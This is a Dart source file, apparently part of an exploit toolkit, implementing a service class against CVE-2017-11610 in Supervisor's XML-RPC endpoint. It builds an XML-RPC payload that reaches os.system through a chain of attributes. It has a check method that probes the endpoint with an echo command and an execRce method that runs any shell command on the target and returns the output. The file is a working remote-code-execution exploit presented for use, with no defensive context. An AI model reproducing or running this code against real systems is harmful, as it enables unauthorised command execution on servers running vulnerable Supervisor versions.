import 'package:http/http.dart' as http;

import 'exp_result.dart';

class SupervisorExpService {
  final String baseUrl;
  final Duration timeout;

  SupervisorExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  String _xmlPayload(String cmd) => '''<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param><string><![CDATA[$cmd]]></string></param>
</params>
</methodCall>''';

  Future<ExpResult> check() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/RPC2'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlPayload('echo supervisord_54289'),
          )
          .timeout(timeout);
      if (res.statusCode == 200 || res.statusCode == 500) {
        return ExpResult(
          true,
          'CVE-2017-11610',
          'Supervisor XML-RPC 端点可访问 (${res.statusCode})',
        );
      }
    } catch (_) {}
    return const ExpResult(false, 'CVE-2017-11610', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/RPC2'),
            headers: {'Content-Type': 'text/xml'},
            body: _xmlPayload(cmd),
          )
          .timeout(timeout);
      return res.body.isNotEmpty ? res.body : null;
    } catch (_) {
      return null;
    }
  }
}
